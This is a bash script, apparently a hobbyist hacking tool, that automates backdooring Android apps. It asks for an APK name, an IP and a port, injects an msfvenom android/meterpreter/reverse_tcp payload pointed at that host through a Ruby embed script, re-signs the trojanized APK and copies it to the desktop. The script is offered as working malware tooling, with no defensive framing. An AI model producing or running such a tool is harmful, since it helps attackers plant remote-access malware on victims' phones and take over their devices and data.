#!/bin/bash
#Compiler
#Coded by DevoOverkill[David]
<<Read!
This tool is embeds an android application with a msfvenom payload by using a embed ruby script
it's just make the embeding more easier and quick

the embeding ruby script is coded by: timwr , Jack64
so i'm really appriciate them alot for this hard work
and i have made this script to make their tool are more easir to use :)

This bash script is coded & developed by : David [DevoOverkill]
Read!



white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
transparent="\e[0m"

printf $(clear)
echo -e """   	
					$red		Autmoatic apk embeding tool        

 █████╗ ██╗   ██╗████████╗ ██████╗     ███████╗███╗   ███╗██████╗ ███████╗██████╗   ██╗██╗  
██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗    ██╔════╝████╗ ████║██╔══██╗██╔════╝██╔══██╗ ██╔╝╚██╗ 
███████║██║   ██║   ██║   ██║   ██║    █████╗  ██╔████╔██║██████╔╝█████╗  ██║  ██║██╔╝  ╚██╗
██╔══██║██║   ██║   ██║   ██║   ██║    ██╔══╝  ██║╚██╔╝██║██╔══██╗██╔══╝  ██║  ██║╚██╗  ██╔╝
██║  ██║╚██████╔╝   ██║   ╚██████╔╝    ███████╗██║ ╚═╝ ██║██████╔╝███████╗██████╔╝ ╚██╗██╔╝ 
╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝     ╚══════╝╚═╝     ╚═╝╚═════╝ ╚══════╝╚═════╝   ╚═╝╚═╝  
"""
sleep 1.0

echo -e "$red>>$Cafe Coded & Developed By :$blue David$Cafe[$red DevoOverkill $Cafe]"
read -p "Enter APK name without format># "  apk #no format please >> !=APK
echo

read -p "Enter IP ># " ip
echo

read -p "Enter Port ># " port
echo

signapk=signapk.jar
certificate=certificate.pem
key=key.pk8
#signapk_command=java -jar $signapk $certificate $key $apk+backdoored.apk $apk.apk

echo -e "$Cafe[$red+$Cafe]$blue Embeding payload with apk...$green"
echo $(ruby embed.rb $apk.apk -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port)
echo

echo -e "$Cafe[$red+$Cafe]$blue Deleting unused files"
$(rm -r original payload original.apk payload.apk)
echo
sleep 2.0

echo -e "$Cafe[$red+$Cafe]$blue Moving backdoored APK.."
echo $(mv $apk+backdoored.apk SignApk)
sleep 1.5

echo -e "$Cafe[$red+$Cafe]$blue Signing APK.."
$(java -jar SignApk/$signapk SignApk/$certificate SignApk/$key SignApk/$apk+backdoored.apk SignApk/$apk.apk)
echo $(rm SignApk/$apk+backdoored.apk)

echo -e "$Cafe[$red+$Cafe]$blue Moving the APK to Desktop"
echo $(cp SignApk/$apk.apk /root/Desktop)
sleep 1.5

echo -e "$Cafe[$red*$Cafe]$blue The backdoored App will be in SignApk Folder or in Desktop!"
echo
sleep 2.0

echo -e "$Cafe[$red+$Cafe]$blue The process has been done successfully!"
echo -e "$Cafe[$red!$Cafe]$blue Exiting..."
sleep 1.0

echo -e """ $purple

@@@  @@@   @@@@@@    @@@@@@@  @@@  @@@  @@@@@@@@  @@@@@@@   @@@  
@@@  @@@  @@@@@@@@  @@@@@@@@  @@@  @@@  @@@@@@@@  @@@@@@@@  @@@  
@@!  @@@  @@!  @@@  !@@       @@!  !@@  @@!       @@!  @@@  @@!  
!@!  @!@  !@!  @!@  !@!       !@!  @!!  !@!       !@!  @!@  !@   
@!@!@!@!  @!@!@!@!  !@!       @!@@!@!   @!!!:!    @!@  !@!  @!@  
!!!@!!!!  !!!@!!!!  !!!       !!@!!!    !!!!!:    !@!  !!!  !!!  
!!:  !!!  !!:  !!!  :!!       !!: :!!   !!:       !!:  !!!       
:!:  !:!  :!:  !:!  :!:       :!:  !:!  :!:       :!:  !:!  :!:  
::   :::  ::   :::   ::: :::   ::  :::   :: ::::   :::: ::   ::  
 :   : :   :   : :   :: :: :   :   :::  : :: ::   :: :  :   :::  

"""
